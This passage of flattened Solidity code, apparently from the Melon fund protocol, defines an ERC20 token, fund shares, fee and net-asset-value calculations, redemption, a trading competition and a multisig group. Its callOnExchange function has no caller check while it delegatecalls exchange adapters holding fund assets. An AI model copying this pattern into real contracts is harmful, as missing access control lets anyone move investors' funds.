}\n}\ncontract DSMath {\n function add(uint x, uint y) internal pure returns (uint z) {\n require((z = x + y) >= x);\n }\n function sub(uint x, uint y) internal pure returns (uint z) {\n require((z = x - y) <= x);\n }\n function mul(uint x, uint y) internal pure returns (uint z) {\n require(y == 0 || (z = x * y) / y == x);\n }\n function min(uint x, uint y) internal pure returns (uint z) {\n return x <= y ? x : y;\n }\n function max(uint x, uint y) internal pure returns (uint z) {\n return x >= y ? x : y;\n }\n function imin(int x, int y) internal pure returns (int z) {\n return x <= y ? x : y;\n }\n function imax(int x, int y) internal pure returns (int z) {\n return x >= y ? x : y;\n }\n uint constant WAD = 10 ** 18;\n uint constant RAY = 10 ** 27;\n function wmul(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, y), WAD / 2) / WAD;\n }\n function rmul(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, y), RAY / 2) / RAY;\n }\n function wdiv(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, WAD), y / 2) / y;\n }\n function rdiv(uint x, uint y) internal pure returns (uint z) {\n z = add(mul(x, RAY), y / 2) / y;\n }\n function rpow(uint x, uint n) internal pure returns (uint z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n}\ncontract Asset is DSMath, ERC20Interface {\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public _totalSupply;\n function transfer(address _to, uint _value)\n public\n returns (bool success)\n {\n require(balances[msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[msg.sender] = sub(balances[msg.sender], _value);\n balances[_to] = add(balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n require(_from != address(0));\n require(_to != address(0));\n require(_to != address(this));\n require(balances[_from] >= _value);\n require(allowed[_from][msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint _value) public returns (bool) {\n require(_spender != address(0));\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n constant\n public\n returns (uint)\n {\n return allowed[_owner][_spender];\n }\n function balanceOf(address _owner) constant public returns (uint) {\n return balances[_owner];\n }\n function totalSupply() view public returns (uint) {\n return _totalSupply;\n }\n}\ncontract Shares is SharesInterface, Asset {\n bytes32 public name;\n bytes8 public symbol;\n uint public decimal;\n uint public creationTime;\n function Shares(bytes32 _name, bytes8 _symbol, uint _decimal, uint _creationTime) {\n name = _name;\n symbol = _symbol;\n decimal = _decimal;\n creationTime = _creationTime;\n }\n function transfer(address _to, uint _value)\n public\n returns (bool success)\n {\n require(balances[msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[msg.sender] = sub(balances[msg.sender], _value);\n balances[_to] = add(balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function getName() view returns (bytes32) { return name; }\n function getSymbol() view returns (bytes8) { return symbol; }\n function getDecimals() view returns (uint) { return decimal; }\n function getCreationTime() view returns (uint) { return creationTime; }\n function toSmallestShareUnit(uint quantity) view returns (uint) { return mul(quantity, 10 ** getDecimals()); }\n function toWholeShareUnit(uint quantity) view returns (uint) { return quantity / (10 ** getDecimals()); }\n function createShares(address recipient, uint shareQuantity) internal {\n _totalSupply = add(_totalSupply, shareQuantity);\n balances[recipient] = add(balances[recipient], shareQuantity);\n emit Created(msg.sender, now, shareQuantity);\n emit Transfer(address(0), recipient, shareQuantity);\n }\n function annihilateShares(address recipient, uint shareQuantity) internal {\n _totalSupply = sub(_totalSupply, shareQuantity);\n balances[recipient] = sub(balances[recipient], shareQuantity);\n emit Annihilated(msg.sender, now, shareQuantity);\n emit Transfer(recipient, address(0), shareQuantity);\n }\n}\ncontract Fund is DSMath, DBC, Owned, Shares, FundInterface {\n event OrderUpdated(address exchange, bytes32 orderId, UpdateType updateType);\n struct Modules {\n CanonicalPriceFeed pricefeed;\n ComplianceInterface compliance;\n RiskMgmtInterface riskmgmt;\n }\n struct Calculations {\n uint gav;\n uint managementFee;\n uint performanceFee;\n uint unclaimedFees;\n uint nav;\n uint highWaterMark;\n uint totalSupply;\n uint timestamp;\n }\n enum UpdateType { make, take, cancel }\n enum RequestStatus { active, cancelled, executed }\n struct Request {\n address participant;\n RequestStatus status;\n address requestAsset;\n uint shareQuantity;\n uint giveQuantity;\n uint receiveQuantity;\n uint timestamp;\n uint atUpdateId;\n }\n struct Exchange {\n address exchange;\n address exchangeAdapter;\n bool takesCustody;\n }\n struct OpenMakeOrder {\n uint id;\n uint expiresAt;\n }\n struct Order {\n address exchangeAddress;\n bytes32 orderId;\n UpdateType updateType;\n address makerAsset;\n address takerAsset;\n uint makerQuantity;\n uint takerQuantity;\n uint timestamp;\n uint fillTakerQuantity;\n }\n uint public constant MAX_FUND_ASSETS = 20;\n uint public constant ORDER_EXPIRATION_TIME = 86400;\n uint public MANAGEMENT_FEE_RATE;\n uint public PERFORMANCE_FEE_RATE;\n address public VERSION;\n Asset public QUOTE_ASSET;\n Modules public modules;\n Exchange[] public exchanges;\n Calculations public atLastUnclaimedFeeAllocation;\n Order[] public orders;\n mapping (address => mapping(address => OpenMakeOrder)) public exchangesToOpenMakeOrders;\n bool public isShutDown;\n Request[] public requests;\n mapping (address => bool) public isInvestAllowed;\n address[] public ownedAssets;\n mapping (address => bool) public isInAssetList;\n mapping (address => bool) public isInOpenMakeOrder;\n function Fund(\n address ofManager,\n bytes32 withName,\n address ofQuoteAsset,\n uint ofManagementFee,\n uint ofPerformanceFee,\n address ofCompliance,\n address ofRiskMgmt,\n address ofPriceFeed,\n address[] ofExchanges,\n address[] ofDefaultAssets\n )\n Shares(withName, \"MLNF\", 18, now)\n {\n require(ofManagementFee < 10 ** 18);\n require(ofPerformanceFee < 10 ** 18);\n isInvestAllowed[ofQuoteAsset] = true;\n owner = ofManager;\n MANAGEMENT_FEE_RATE = ofManagementFee;\n PERFORMANCE_FEE_RATE = ofPerformanceFee;\n VERSION = msg.sender;\n modules.compliance = ComplianceInterface(ofCompliance);\n modules.riskmgmt = RiskMgmtInterface(ofRiskMgmt);\n modules.pricefeed = CanonicalPriceFeed(ofPriceFeed);\n for (uint i = 0; i < ofExchanges.length; ++i) {\n require(modules.pricefeed.exchangeIsRegistered(ofExchanges[i]));\n var (ofExchangeAdapter, takesCustody, ) = modules.pricefeed.getExchangeInformation(ofExchanges[i]);\n exchanges.push(Exchange({\n exchange: ofExchanges[i],\n exchangeAdapter: ofExchangeAdapter,\n takesCustody: takesCustody\n }));\n }\n QUOTE_ASSET = Asset(ofQuoteAsset);\n ownedAssets.push(ofQuoteAsset);\n isInAssetList[ofQuoteAsset] = true;\n require(address(QUOTE_ASSET) == modules.pricefeed.getQuoteAsset());\n for (uint j = 0; j < ofDefaultAssets.length; j++) {\n require(modules.pricefeed.assetIsRegistered(ofDefaultAssets[j]));\n isInvestAllowed[ofDefaultAssets[j]] = true;\n }\n atLastUnclaimedFeeAllocation = Calculations({\n gav: 0,\n managementFee: 0,\n performanceFee: 0,\n unclaimedFees: 0,\n nav: 0,\n highWaterMark: 10 ** getDecimals(),\n totalSupply: _totalSupply,\n timestamp: now\n });\n }\n function enableInvestment(address[] ofAssets)\n external\n pre_cond(isOwner())\n {\n for (uint i = 0; i < ofAssets.length; ++i) {\n require(modules.pricefeed.assetIsRegistered(ofAssets[i]));\n isInvestAllowed[ofAssets[i]] = true;\n }\n }\n function disableInvestment(address[] ofAssets)\n external\n pre_cond(isOwner())\n {\n for (uint i = 0; i < ofAssets.length; ++i) {\n isInvestAllowed[ofAssets[i]] = false;\n }\n }\n function shutDown() external pre_cond(msg.sender == VERSION) { isShutDown = true; }\n function requestInvestment(\n uint giveQuantity,\n uint shareQuantity,\n address investmentAsset\n )\n external\n pre_cond(!isShutDown)\n pre_cond(isInvestAllowed[investmentAsset])\n pre_cond(modules.compliance.isInvestmentPermitted(msg.sender, giveQuantity, shareQuantity))\n {\n requests.push(Request({\n participant: msg.sender,\n status: RequestStatus.active,\n requestAsset: investmentAsset,\n shareQuantity: shareQuantity,\n giveQuantity: giveQuantity,\n receiveQuantity: shareQuantity,\n timestamp: now,\n atUpdateId: modules.pricefeed.getLastUpdateId()\n }));\n emit RequestUpdated(getLastRequestId());\n }\n function executeRequest(uint id)\n external\n pre_cond(!isShutDown)\n pre_cond(requests[id].status == RequestStatus.active)\n pre_cond(\n _totalSupply == 0 ||\n (\n now >= add(requests[id].timestamp, modules.pricefeed.getInterval()) &&\n modules.pricefeed.getLastUpdateId() >= add(requests[id].atUpdateId, 2)\n )\n )\n {\n Request request = requests[id];\n var (isRecent, , ) =\n modules.pricefeed.getPriceInfo(address(request.requestAsset));\n require(isRecent);\n uint costQuantity = toWholeShareUnit(mul(request.shareQuantity, calcSharePriceAndAllocateFees()));\n if (request.requestAsset != address(QUOTE_ASSET)) {\n var (isPriceRecent, invertedRequestAssetPrice, requestAssetDecimal) = modules.pricefeed.getInvertedPriceInfo(request.requestAsset);\n if (!isPriceRecent) {\n revert();\n }\n costQuantity = mul(costQuantity, invertedRequestAssetPrice) / 10 ** requestAssetDecimal;\n }\n if (\n isInvestAllowed[request.requestAsset] &&\n costQuantity <= request.giveQuantity\n ) {\n request.status = RequestStatus.executed;\n require(AssetInterface(request.requestAsset).transferFrom(request.participant, address(this), costQuantity));\n createShares(request.participant, request.shareQuantity);\n if (!isInAssetList[request.requestAsset]) {\n ownedAssets.push(request.requestAsset);\n isInAssetList[request.requestAsset] = true;\n }\n } else {\n revert();\n }\n }\n function cancelRequest(uint id)\n external\n pre_cond(requests[id].status == RequestStatus.active)\n pre_cond(requests[id].participant == msg.sender || isShutDown)\n {\n requests[id].status = RequestStatus.cancelled;\n }\n function redeemAllOwnedAssets(uint shareQuantity)\n external\n returns (bool success)\n {\n return emergencyRedeem(shareQuantity, ownedAssets);\n }\n function callOnExchange(\n uint exchangeIndex,\n bytes4 method,\n address[5] orderAddresses,\n uint[8] orderValues,\n bytes32 identifier,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n external\n {\n require(\n modules.pricefeed.exchangeMethodIsAllowed(\n exchanges[exchangeIndex].exchange, method\n )\n );\n require(\n exchanges[exchangeIndex].exchangeAdapter.delegatecall(\n method, exchanges[exchangeIndex].exchange,\n orderAddresses, orderValues, identifier, v, r, s\n )\n );\n }\n function addOpenMakeOrder(\n address ofExchange,\n address ofSellAsset,\n uint orderId\n )\n pre_cond(msg.sender == address(this))\n {\n isInOpenMakeOrder[ofSellAsset] = true;\n exchangesToOpenMakeOrders[ofExchange][ofSellAsset].id = orderId;\n exchangesToOpenMakeOrders[ofExchange][ofSellAsset].expiresAt = add(now, ORDER_EXPIRATION_TIME);\n }\n function removeOpenMakeOrder(\n address ofExchange,\n address ofSellAsset\n )\n pre_cond(msg.sender == address(this))\n {\n delete exchangesToOpenMakeOrders[ofExchange][ofSellAsset];\n }\n function orderUpdateHook(\n address ofExchange,\n bytes32 orderId,\n UpdateType updateType,\n address[2] orderAddresses,\n uint[3] orderValues\n )\n pre_cond(msg.sender == address(this))\n {\n if (updateType == UpdateType.make || updateType == UpdateType.take) {\n orders.push(Order({\n exchangeAddress: ofExchange,\n orderId: orderId,\n updateType: updateType,\n makerAsset: orderAddresses[0],\n takerAsset: orderAddresses[1],\n makerQuantity: orderValues[0],\n takerQuantity: orderValues[1],\n timestamp: block.timestamp,\n fillTakerQuantity: orderValues[2]\n }));\n }\n emit OrderUpdated(ofExchange, orderId, updateType);\n }\n function calcGav() returns (uint gav) {\n uint[] memory allAssetHoldings = new uint[](ownedAssets.length);\n uint[] memory allAssetPrices = new uint[](ownedAssets.length);\n address[] memory tempOwnedAssets;\n tempOwnedAssets = ownedAssets;\n delete ownedAssets;\n for (uint i = 0; i < tempOwnedAssets.length; ++i) {\n address ofAsset = tempOwnedAssets[i];\n uint assetHoldings = add(\n uint(AssetInterface(ofAsset).balanceOf(address(this))),\n quantityHeldInCustodyOfExchange(ofAsset)\n );\n var (isRecent, assetPrice, assetDecimals) = modules.pricefeed.getPriceInfo(ofAsset);\n if (!isRecent) {\n revert();\n }\n allAssetHoldings[i] = assetHoldings;\n allAssetPrices[i] = assetPrice;\n gav = add(gav, mul(assetHoldings, assetPrice) / (10 ** uint256(assetDecimals)));\n if (assetHoldings != 0 || ofAsset == address(QUOTE_ASSET) || isInOpenMakeOrder[ofAsset]) {\n ownedAssets.push(ofAsset);\n } else {\n isInAssetList[ofAsset] = false;\n }\n }\n emit PortfolioContent(tempOwnedAssets, allAssetHoldings, allAssetPrices);\n }\n function addAssetToOwnedAssets (address ofAsset)\n public\n pre_cond(isOwner() || msg.sender == address(this))\n {\n isInOpenMakeOrder[ofAsset] = true;\n if (!isInAssetList[ofAsset]) {\n ownedAssets.push(ofAsset);\n isInAssetList[ofAsset] = true;\n }\n }\n function calcUnclaimedFees(uint gav)\n view\n returns (\n uint managementFee,\n uint performanceFee,\n uint unclaimedFees)\n {\n uint timePassed = sub(now, atLastUnclaimedFeeAllocation.timestamp);\n uint gavPercentage = mul(timePassed, gav) / (1 years);\n managementFee = wmul(gavPercentage, MANAGEMENT_FEE_RATE);\n uint valuePerShareExclMgmtFees = _totalSupply > 0 ? calcValuePerShare(sub(gav, managementFee), _totalSupply) : toSmallestShareUnit(1);\n if (valuePerShareExclMgmtFees > atLastUnclaimedFeeAllocation.highWaterMark) {\n uint gainInSharePrice = sub(valuePerShareExclMgmtFees, atLastUnclaimedFeeAllocation.highWaterMark);\n uint investmentProfits = wmul(gainInSharePrice, _totalSupply);\n performanceFee = wmul(investmentProfits, PERFORMANCE_FEE_RATE);\n }\n unclaimedFees = add(managementFee, performanceFee);\n }\n function calcNav(uint gav, uint unclaimedFees)\n view\n returns (uint nav)\n {\n nav = sub(gav, unclaimedFees);\n }\n function calcValuePerShare(uint totalValue, uint numShares)\n view\n pre_cond(numShares > 0)\n returns (uint valuePerShare)\n {\n valuePerShare = toSmallestShareUnit(totalValue) / numShares;\n }\n function performCalculations()\n view\n returns (\n uint gav,\n uint managementFee,\n uint performanceFee,\n uint unclaimedFees,\n uint feesShareQuantity,\n uint nav,\n uint sharePrice\n )\n {\n gav = calcGav();\n (managementFee, performanceFee, unclaimedFees) = calcUnclaimedFees(gav);\n nav = calcNav(gav, unclaimedFees);\n feesShareQuantity = (gav == 0) ? 0 : mul(_totalSupply, unclaimedFees) / gav;\n uint totalSupplyAccountingForFees = add(_totalSupply, feesShareQuantity);\n sharePrice = _totalSupply > 0 ? calcValuePerShare(gav, totalSupplyAccountingForFees) : toSmallestShareUnit(1);\n }\n function calcSharePriceAndAllocateFees() public returns (uint)\n {\n var (\n gav,\n managementFee,\n performanceFee,\n unclaimedFees,\n feesShareQuantity,\n nav,\n sharePrice\n ) = performCalculations();\n createShares(owner, feesShareQuantity);\n uint highWaterMark = atLastUnclaimedFeeAllocation.highWaterMark >= sharePrice ? atLastUnclaimedFeeAllocation.highWaterMark : sharePrice;\n atLastUnclaimedFeeAllocation = Calculations({\n gav: gav,\n managementFee: managementFee,\n performanceFee: performanceFee,\n unclaimedFees: unclaimedFees,\n nav: nav,\n highWaterMark: highWaterMark,\n totalSupply: _totalSupply,\n timestamp: now\n });\n emit FeesConverted(now, feesShareQuantity, unclaimedFees);\n emit CalculationUpdate(now, managementFee, performanceFee, nav, sharePrice, _totalSupply);\n return sharePrice;\n }\n function emergencyRedeem(uint shareQuantity, address[] requestedAssets)\n public\n pre_cond(balances[msg.sender] >= shareQuantity)\n returns (bool)\n {\n address ofAsset;\n uint[] memory ownershipQuantities = new uint[](requestedAssets.length);\n address[] memory redeemedAssets = new address[](requestedAssets.length);\n for (uint i = 0; i < requestedAssets.length; ++i) {\n ofAsset = requestedAssets[i];\n require(isInAssetList[ofAsset]);\n for (uint j = 0; j < redeemedAssets.length; j++) {\n if (ofAsset == redeemedAssets[j]) {\n revert();\n }\n }\n redeemedAssets[i] = ofAsset;\n uint assetHoldings = add(\n uint(AssetInterface(ofAsset).balanceOf(address(this))),\n quantityHeldInCustodyOfExchange(ofAsset)\n );\n if (assetHoldings == 0) continue;\n ownershipQuantities[i] = mul(assetHoldings, shareQuantity) / _totalSupply;\n if (uint(AssetInterface(ofAsset).balanceOf(address(this))) < ownershipQuantities[i]) {\n isShutDown = true;\n emit ErrorMessage(\"CRITICAL ERR: Not enough assetHoldings for owed ownershipQuantitiy\");\n return false;\n }\n }\n annihilateShares(msg.sender, shareQuantity);\n for (uint k = 0; k < requestedAssets.length; ++k) {\n ofAsset = requestedAssets[k];\n if (ownershipQuantities[k] == 0) {\n continue;\n } else if (!AssetInterface(ofAsset).transfer(msg.sender, ownershipQuantities[k])) {\n revert();\n }\n }\n emit Redeemed(msg.sender, now, shareQuantity);\n return true;\n }\n function quantityHeldInCustodyOfExchange(address ofAsset) returns (uint) {\n uint totalSellQuantity;\n uint totalSellQuantityInApprove;\n for (uint i; i < exchanges.length; i++) {\n if (exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset].id == 0) {\n continue;\n }\n var (sellAsset, , sellQuantity, ) = GenericExchangeInterface(exchanges[i].exchangeAdapter).getOrder(exchanges[i].exchange, exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset].id);\n if (sellQuantity == 0) {\n delete exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset];\n }\n totalSellQuantity = add(totalSellQuantity, sellQuantity);\n if (!exchanges[i].takesCustody) {\n totalSellQuantityInApprove += sellQuantity;\n }\n }\n if (totalSellQuantity == 0) {\n isInOpenMakeOrder[sellAsset] = false;\n }\n return sub(totalSellQuantity, totalSellQuantityInApprove);\n }\n function calcSharePrice() view returns (uint sharePrice) {\n (, , , , , sharePrice) = performCalculations();\n return sharePrice;\n }\n function getModules() view returns (address, address, address) {\n return (\n address(modules.pricefeed),\n address(modules.compliance),\n address(modules.riskmgmt)\n );\n }\n function getLastRequestId() view returns (uint) { return requests.length - 1; }\n function getLastOrderIndex() view returns (uint) { return orders.length - 1; }\n function getManager() view returns (address) { return owner; }\n function getOwnedAssetsLength() view returns (uint) { return ownedAssets.length; }\n function getExchangeInfo() view returns (address[], address[], bool[]) {\n address[] memory ofExchanges = new address[](exchanges.length);\n address[] memory ofAdapters = new address[](exchanges.length);\n bool[] memory takesCustody = new bool[](exchanges.length);\n for (uint i = 0; i < exchanges.length; i++) {\n ofExchanges[i] = exchanges[i].exchange;\n ofAdapters[i] = exchanges[i].exchangeAdapter;\n takesCustody[i] = exchanges[i].takesCustody;\n }\n return (ofExchanges, ofAdapters, takesCustody);\n }\n function orderExpired(address ofExchange, address ofAsset) view returns (bool) {\n uint expiryTime = exchangesToOpenMakeOrders[ofExchange][ofAsset].expiresAt;\n require(expiryTime > 0);\n return block.timestamp >= expiryTime;\n }\n function getOpenOrderInfo(address ofExchange, address ofAsset) view returns (uint, uint) {\n OpenMakeOrder order = exchangesToOpenMakeOrders[ofExchange][ofAsset];\n return (order.id, order.expiresAt);\n }\n}\ncontract Competition is CompetitionInterface, DSMath, DBC, Owned {\n struct Registrant {\n address fund;\n address registrant;\n bool hasSigned;\n uint buyinQuantity;\n uint payoutQuantity;\n bool isRewarded;\n }\n struct RegistrantId {\n uint id;\n bool exists;\n }\n bytes public constant TERMS_AND_CONDITIONS = hex\"12208E21FD34B8B2409972D30326D840C9D747438A118580D6BA8C0735ED53810491\";\n uint public MELON_BASE_UNIT = 10 ** 18;\n address public custodian;\n uint public startTime;\n uint public endTime;\n uint public payoutRate;\n uint public bonusRate;\n uint public totalMaxBuyin;\n uint public currentTotalBuyin;\n uint public maxRegistrants;\n uint public prizeMoneyAsset;\n uint public prizeMoneyQuantity;\n address public MELON_ASSET;\n ERC20Interface public MELON_CONTRACT;\n address public COMPETITION_VERSION;\n Registrant[] public registrants;\n mapping (address => address) public registeredFundToRegistrants;\n mapping(address => RegistrantId) public registrantToRegistrantIds;\n mapping(address => uint) public whitelistantToMaxBuyin;\n event Register(uint withId, address fund, address manager);\n function Competition(\n address ofMelonAsset,\n address ofCompetitionVersion,\n address ofCustodian,\n uint ofStartTime,\n uint ofEndTime,\n uint ofPayoutRate,\n uint ofTotalMaxBuyin,\n uint ofMaxRegistrants\n ) {\n MELON_ASSET = ofMelonAsset;\n MELON_CONTRACT = ERC20Interface(MELON_ASSET);\n COMPETITION_VERSION = ofCompetitionVersion;\n custodian = ofCustodian;\n startTime = ofStartTime;\n endTime = ofEndTime;\n payoutRate = ofPayoutRate;\n totalMaxBuyin = ofTotalMaxBuyin;\n maxRegistrants = ofMaxRegistrants;\n }\n function termsAndConditionsAreSigned(address byManager, uint8 v, bytes32 r, bytes32 s) view returns (bool) {\n return ecrecover(\n keccak256(\"\\x19Ethereum Signed Message:\\n34\", TERMS_AND_CONDITIONS),\n v,\n r,\n s\n ) == byManager;\n }\n function isWhitelisted(address x) view returns (bool) { return whitelistantToMaxBuyin[x] > 0; }\n function isCompetitionActive() view returns (bool) { return now >= startTime && now < endTime; }\n function getMelonAsset() view returns (address) { return MELON_ASSET; }\n function getRegistrantId(address x) view returns (uint) { return registrantToRegistrantIds[x].id; }\n function getRegistrantFund(address x) view returns (address) { return registrants[getRegistrantId(x)].fund; }\n function getTimeTillEnd() view returns (uint) {\n if (now > endTime) {\n return 0;\n }\n return sub(endTime, now);\n }\n function getEtherValue(uint amount) view returns (uint) {\n address feedAddress = Version(COMPETITION_VERSION).CANONICAL_PRICEFEED();\n var (isRecent, price, ) = CanonicalPriceFeed(feedAddress).getPriceInfo(MELON_ASSET);\n if (!isRecent) {\n revert();\n }\n return mul(price, amount) / 10 ** 18;\n }\n function calculatePayout(uint payin) view returns (uint payoutQuantity) {\n payoutQuantity = mul(payin, payoutRate) / 10 ** 18;\n }\n function getCompetitionStatusOfRegistrants()\n view\n returns(\n address[],\n address[],\n bool[]\n )\n {\n address[] memory fundAddrs = new address[](registrants.length);\n address[] memory fundRegistrants = new address[](registrants.length);\n bool[] memory isRewarded = new bool[](registrants.length);\n for (uint i = 0; i < registrants.length; i++) {\n fundAddrs[i] = registrants[i].fund;\n fundRegistrants[i] = registrants[i].registrant;\n isRewarded[i] = registrants[i].isRewarded;\n }\n return (fundAddrs, fundRegistrants, isRewarded);\n }\n function registerForCompetition(\n address fund,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n payable\n pre_cond(isCompetitionActive() && !Version(COMPETITION_VERSION).isShutDown())\n pre_cond(termsAndConditionsAreSigned(msg.sender, v, r, s) && isWhitelisted(msg.sender))\n {\n require(registeredFundToRegistrants[fund] == address(0) && registrantToRegistrantIds[msg.sender].exists == false);\n require(add(currentTotalBuyin, msg.value) <= totalMaxBuyin && registrants.length < maxRegistrants);\n require(msg.value <= whitelistantToMaxBuyin[msg.sender]);\n require(Version(COMPETITION_VERSION).getFundByManager(msg.sender) == fund);\n uint payoutQuantity = calculatePayout(msg.value);\n registeredFundToRegistrants[fund] = msg.sender;\n registrantToRegistrantIds[msg.sender] = RegistrantId({id: registrants.length, exists: true});\n currentTotalBuyin = add(currentTotalBuyin, msg.value);\n FundInterface fundContract = FundInterface(fund);\n MELON_CONTRACT.approve(fund, payoutQuantity);\n fundContract.requestInvestment(payoutQuantity, getEtherValue(payoutQuantity), MELON_ASSET);\n fundContract.executeRequest(fundContract.getLastRequestId());\n custodian.transfer(msg.value);\n emit Register(registrants.length, fund, msg.sender);\n registrants.push(Registrant({\n fund: fund,\n registrant: msg.sender,\n hasSigned: true,\n buyinQuantity: msg.value,\n payoutQuantity: payoutQuantity,\n isRewarded: false\n }));\n }\n function batchAddToWhitelist(\n uint maxBuyinQuantity,\n address[] whitelistants\n )\n pre_cond(isOwner())\n pre_cond(now < endTime)\n {\n for (uint i = 0; i < whitelistants.length; ++i) {\n whitelistantToMaxBuyin[whitelistants[i]] = maxBuyinQuantity;\n }\n }\n function withdrawMln(address to, uint amount)\n pre_cond(isOwner())\n {\n MELON_CONTRACT.transfer(to, amount);\n }\n function claimReward()\n pre_cond(getRegistrantFund(msg.sender) != address(0))\n {\n require(block.timestamp >= endTime || Version(COMPETITION_VERSION).isShutDown());\n Registrant registrant = registrants[getRegistrantId(msg.sender)];\n require(registrant.isRewarded == false);\n registrant.isRewarded = true;\n uint balance = AssetInterface(registrant.fund).balanceOf(address(this));\n require(AssetInterface(registrant.fund).transfer(registrant.registrant, balance));\n emit ClaimReward(msg.sender, registrant.fund, balance);\n }\n}\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract DSGroup is DSExec, DSNote {\n address[] public members;\n uint public quorum;\n uint public window;\n uint public actionCount;\n mapping (uint => Action) public actions;\n mapping (uint => mapping (address => bool)) public confirmedBy;\n mapping (address => bool) public isMember;\n event Proposed (uint id, bytes calldata);\n event Confirmed (uint id, address member);\n event Triggered (uint id);\n struct Action {\n address target;\n bytes calldata;\n uint value;\n uint confirmations;\n uint deadline;\n bool triggered;\n }\n function DSGroup(\n address[] members_,\n uint quorum_,\n uint window_\n ) {\n members = members_;\n quorum = quorum_;\n window = window_;\n for (uint i = 0; i < members.length; i++) {\n isMember[members[i]] = true;\n }\n }\n function memberCount() constant returns (uint) {\n return members.length;\n }\n function target(uint id) constant returns (address) {\n return actions[id].target;\n }\n function calldata(uint id) constant returns (bytes) {\n return actions[id].calldata;\n }\n function value(uint id) constant returns (uint) {\n return actions[id].value;\n }\n function confirmations(uint id) constant returns (uint) {\n return actions[id].confirmations;\n }\n function deadline(uint id) constant returns (uint) {\n return actions[id].deadline;\n }\n function triggered(uint id) constant returns (bool) {\n return actions[id].triggered;\n }\n function confirmed(uint id) constant returns (bool) {\n return confirmations(id) >= quorum;\n }\n function expired(uint id) constant returns (bool) {\n return now > deadline(id);\n }\n function deposit() note payable {\n }\n function propose(\n address target,\n bytes calldata,\n uint value\n ) onlyMembers note returns (uint id) {\n id = ++actionCount;\n actions[id].target = target;\n actions[id].calldata = calldata;\n actions[id].value = value;\n actions[id].deadline = now + window;\n Proposed(id, calldata);\n }\n function confirm(uint id) onlyMembers onlyActive(id) note {\n assert(!confirmedBy[id][msg.sender]);\n confirmedBy[id][msg.sender] = true;\n actions[id].confirmations++;\n Confirmed(id, msg.sender);\n }\n function trigger(uint id) onlyMembers onlyActive(id) note {\n assert(confirmed(id));\n actions[id].triggered = true;\n exec(actions[id].target, actions[id].calldata, actions[id].value);\n Triggered(id);\n }\n modifier onlyMembers {\n assert(isMember[msg.sender]);\n _;\n }\n modifier onlyActive(uint id) {\n assert(!expired(id));\n assert(!triggered(id));\n _;\n }\n function getInfo() constant returns (\n uint quorum_,\n uint memberCount,\n uint window_,\n uint actionCount_\n ) {\n return (quorum, members.length, window, actionCount);\n }\n function getActionStatus(uint id) constant returns (\n uint confirmations,\n uint deadline,\n bool triggered,\n address target,\n uint value\n ) {\n return (\n actions[id].confirmations,\n actions[id].deadline,\n actions[id].triggered,\n actions[id].target,\n actions[id].value\n );\n }\n}\ncontract DSGroupFactory is DSNote {\n mapping (address => bool) public isGroup;\n function newGroup(\n address[] members,\n uint quorum,\n uint window\n ) note returns (DSGroup group) {\n group = new DSGroup(members, quorum, window);\n isGroup[group] = true;\n }\n}\ncontract DSThing is DSAuth, DSNote, DSMath {\n function S(string s) internal pure returns (bytes4) {\n return bytes4(keccak256(s));\n }\n}\ninterface GenericExchangeInterface {\n event OrderUpdated(uint id);\n function makeOrder(\n address onExchange,\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n ) external returns (uint);\n function takeOrder(address onExchange, uint id, uint quantity) external returns (bool);\n function cancelOrder(address onExchange, uint id) external returns (bool);\n function isApproveOnly() view returns (bool);\n function getLastOrderId(address onExchange) view returns (uint);\n function isActive(address onExchange, uint id) view returns (bool);\n function getOwner(address onExchange, uint id) view returns (address);\n function getOrder(address onExchange, uint id) view returns (address, address, uint, uint);\n function getTimestamp(address onExchange, uint id) view returns (uint);\n}\ncontract CanonicalRegistrar is DSThing, DBC {\n struct Asset {\n bool exists;\n bytes32 name;\n bytes8 symbol;\n uint decimals;\n string url;\n string ipfsHash;\n address breakIn;\n address breakOut;\n uint[] standards;\n bytes4[] functionSignatures;\n uint price;\n uint timestamp;\n }\n struct Exchange {\n bool exists;\n address adapter;\n bool takesCustody;\n bytes4[] functionSignatures;\n }\n mapping (address => Asset) public assetInformation;\n address[] public registeredAssets;\n mapping (address => Exchange) public exchangeInformation;\n address[] public registeredExchanges;\n function registerAsset(\n address ofAsset,\n bytes32 inputName,\n bytes8 inputSymbol,\n uint inputDecimals,\n string inputUrl,\n string inputIpfsHash,\n address[2] breakInBreakOut,\n uint[] inputStandards,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(!assetInformation[ofAsset].exists)\n {\n assetInformation[ofAsset].exists = true;\n registeredAssets.push(ofAsset);\n updateAsset(\n ofAsset,\n inputName,\n inputSymbol,\n inputDecimals,\n inputUrl,\n inputIpfsHash,\n breakInBreakOut,\n inputStandards,\n inputFunctionSignatures\n );\n assert(assetInformation[ofAsset].exists);\n }\n function registerExchange(\n address ofExchange,\n address ofExchangeAdapter,\n bool 